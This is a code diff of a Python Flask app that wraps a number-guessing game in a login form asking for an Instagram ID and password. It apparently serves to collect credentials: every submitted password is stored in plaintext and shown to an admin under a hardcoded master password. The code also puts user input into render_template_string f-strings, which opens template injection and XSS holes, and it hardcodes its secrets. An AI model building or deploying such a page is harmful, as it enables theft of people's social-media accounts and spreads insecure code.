@@ -1,42 +1,53 @@
 from flask import Flask, request, render_template_string, redirect, url_for, session
 import json
-import random
 import os
+import random
 
 app = Flask(__name__)
-app.secret_key = "supersecretkey123"  # needed for sessions
+app.secret_key = "supersecretkey123"
 
 USERS_FILE = "users.json"
 
-# Ensure users.json exists
+# Auto-create users.json if missing
 if not os.path.exists(USERS_FILE):
     with open(USERS_FILE, "w") as f:
         json.dump({}, f)
 
-# Load users
 def load_users():
     with open(USERS_FILE) as f:
         return json.load(f)
 
-# Save users
 def save_users(users):
     with open(USERS_FILE, "w") as f:
         json.dump(users, f, indent=2)
 
+# ===== SIGNUP / LOGIN =====
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         insta_id = request.form.get('insta_id')
-        password = request.form.get('instagram_password')
+        password = request.form.get('password')
         users = load_users()
 
-        if insta_id in users and users[insta_id] == password:
+        # Add new user if not exist → always pending approval
+        if insta_id not in users:
+            users[insta_id] = {"password": password, "approved": None}
+            save_users(users)
+
+        user = users[insta_id]
+
+        if user['approved'] is True:
             session['user'] = insta_id
-            session['number'] = random.randint(1, 20)  # game number
+            session['number'] = random.randint(1, 20)
             return redirect(url_for('game'))
+        elif user['approved'] is False:
+            return render_template_string("""
+            <script>alert("❌ Your login was denied by admin.");</script>
+            <meta http-equiv="refresh" content="0; url=/" />
+            """)
         else:
             return render_template_string("""
-            <script>alert("❌ Invalid login! Check Insta ID and password.");</script>
+            <script>alert("⏳ Waiting for admin approval.");</script>
             <meta http-equiv="refresh" content="0; url=/" />
             """)
 
@@ -44,22 +55,23 @@ def login():
     <html>
     <head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head>
     <body style='text-align:center; font-family:sans-serif;'>
-        <h1>Login</h1>
+        <h1>Login / Request Access</h1>
         <form method='POST'>
             <input name='insta_id' placeholder='Instagram ID' required><br><br>
             <input type='password' name='password' placeholder='Password' required><br><br>
-            <button type='submit'>Login</button>
+            <button type='submit'>Submit</button>
         </form>
-        <p>Want to see/add users? <a href="/admin">Admin Panel</a></p>
+        <p>Admin? <a href="/admin">Go to Admin Panel</a></p>
     </body>
     </html>
     """)
 
+# ===== MINI GAME =====
 @app.route('/game', methods=['GET', 'POST'])
 def game():
     if 'user' not in session:
         return redirect(url_for('login'))
-    
+
     message = ""
     if request.method == 'POST':
         guess = int(request.form.get('guess'))
@@ -70,16 +82,15 @@ def game():
             message = "Too high! 📈"
         else:
             message = f"🎉 Congrats {session['user']}! You guessed it!"
-            session['number'] = random.randint(1, 20)  # reset game
-    
+            session['number'] = random.randint(1, 20)
+
     return render_template_string(f"""
     <html>
-    <head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head>
     <body style='text-align:center; font-family:sans-serif;'>
         <h1>Welcome {session['user']}!</h1>
         <p>Guess the number between 1 and 20:</p>
         <form method='POST'>
-            <input type='number' name='guess' required min='1' max='20'>
+            <input type='number' name='guess' min='1' max='20' required>
             <button type='submit'>Guess</button>
         </form>
         <h2>{message}</h2>
@@ -88,49 +99,79 @@ def game():
     </html>
     """)
 
+# ===== ADMIN PANEL =====
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
-    # Admin panel for viewing/adding users
+    master_pass = "slicingyourlife"
+
+    # Check master password
+    if request.method == 'POST' and 'master' in request.form:
+        entered = request.form.get('master')
+        if entered != master_pass:
+            return render_template_string("""
+            <script>alert("❌ Wrong admin password!");</script>
+            <meta http-equiv="refresh" content="0; url=/admin" />
+            """)
+        session['admin'] = True
+        return redirect(url_for('admin'))
+
+    if not session.get('admin'):
+        return render_template_string("""
+        <html>
+        <body style='text-align:center; font-family:sans-serif;'>
+            <h1>Admin Login</h1>
+            <form method='POST'>
+                <input type='password' name='master' placeholder='Admin Password' required>
+                <button type='submit'>Enter</button>
+            </form>
+        </body>
+        </html>
+        """)
+
+    # Admin sees all pending users
     users = load_users()
     msg = ""
-    if request.method == 'POST':
-        new_id = request.form.get('new_id')
-        new_pass = request.form.get('new_pass')
-        if new_id in users:
-            msg = "User already exists!"
-        else:
-            users[new_id] = new_pass
+    action = request.args.get('action')
+    user_id = request.args.get('user')
+    if action and user_id:
+        if user_id in users:
+            if action == 'approve':
+                users[user_id]['approved'] = True
+                msg = f"{user_id} approved ✅"
+            elif action == 'deny':
+                users[user_id]['approved'] = False
+                msg = f"{user_id} denied ❌"
             save_users(users)
-            msg = f"User {new_id} added!"
 
-    # Show all users and passwords
-    user_list_html = "<ul>"
-    for u, p in users.items():
-        user_list_html += f"<li>{u} : {p}</li>"
-    user_list_html += "</ul>"
+    pending = {u:d for u,d in users.items() if d['approved'] is None}
+    pending_html = ""
+    for u in pending:
+        pending_html += f"""
+        <li>{u} - Password: {users[u]['password']} - 
+        <a href='/admin?action=approve&user={u}'>Approve ✅</a> | 
+        <a href='/admin?action=deny&user={u}'>Deny ❌</a>
+        </li>
+        """
 
     return render_template_string(f"""
     <html>
-    <head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head>
     <body style='text-align:center; font-family:sans-serif;'>
         <h1>Admin Panel</h1>
-        <h2>Add New User</h2>
-        <form method='POST'>
-            <input name='new_id' placeholder='Instagram ID' required><br><br>
-            <input name='new_pass' placeholder='Password' required><br><br>
-            <button type='submit'>Add User</button>
-        </form>
-        <h2>Existing Users</h2>
-        {user_list_html}
+        <h2>Pending Requests</h2>
+        <ul>
+        {pending_html if pending_html else "<li>No pending requests</li>"}
+        </ul>
         <p style='color:green;'>{msg}</p>
         <p><a href="/">Back to Login</a></p>
     </body>
     </html>
     """)
 
+# ===== LOGOUT =====
 @app.route('/logout')
 def logout():
     session.pop('user', None)
+    session.pop('admin', None)
     return redirect(url_for('login'))
 
 if __name__ == '__main__':
